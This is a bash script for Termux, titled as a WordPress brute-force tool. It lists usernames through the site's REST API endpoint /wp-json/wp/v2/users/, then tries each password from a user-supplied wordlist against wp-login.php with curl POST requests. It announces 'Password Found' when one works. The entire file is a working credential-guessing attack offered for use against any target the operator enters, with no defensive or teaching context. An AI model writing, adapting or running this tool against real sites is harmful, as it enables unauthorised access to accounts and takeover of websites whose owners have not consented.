#!/data/data/com.termux/files/usr/bin/bash
#WordPress BruteForce Script
#Coded By CyberBullet
api="/wp-json/wp/v2/users/"
urlencode() {
#Taken Form Github
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}
banner () {
bash banner.sh
echo -e "\e[1;34m
          /     \ /=\ /=)        |-     /=\                
          | =|= | |=/ |<  /= | | |  /=\ |=  /=\ /= /=: /=\ 
           \/ \/  |   \=) |  \=/ \= \=  |   \=/ |  \=: \=/
\e[0m"
}
crack () {
while IFS= read -r rpass;do
echo -e "\e[1;32mCracking........\e[0m"
echo -e "\e[1;31mCracking : $rpass\e[0m"
uname=$(urlencode $name)
pass=$(urlencode $rpass)
targetu=$(urlencode $target)
return=$(curl -ks -H "application/x-www-form-urlencoded" -X POST -d "log=$uname&pwd=$pass&rememberme=forever&wp-submit=Log+In&redirect_to=$targetu/wp-admin&testcookie=1" $target/wp-login.php -b wp_cookies)
if [[ $return == "" ]];then
echo -e "\e[1;32mPassword Found : \e[1;33m$rpass"
exit
else
echo ""
fi
done < $wl
echo -e "\e[1;33mPassword Not Found \e[0m"
}
brute () {
#Get Cookies
curl -Iks -c wp_cookies $target/wp-login.php >/dev/null
#Crack Password
read -p $'\e[1;32mEnter Wordlist : \e[0m' wl
if [[ -e $wl ]];then
crack
else
echo -e "\e[1;31mWordList Not Found\e[0m"
fi
}
userenum () {
echo -ne "\e[1;33mUsername : "
name=$(curl -ks -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" -L $target$api | jq -r ".[].name")
echo -e "\e[1;31m$name\e[0m"
brute
}
muser () {
echo -e "\e[1;31mCouldn't Detect Username Please Enter Username Manually\e[0m"
read -p $'\e[1;32mUsername : ' name
brute
}
check_api () {
type=$(curl -Iks -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" -L $target$api | grep -i "content-type:" | awk '{ print $2 }')
if [[ $type == "application/json;" || $type == "application/json" ]];then
userenum
else
muser
fi
}
main () {
banner
read -p $'\e[1;32mEnter Target : ' target
check_api
}
main
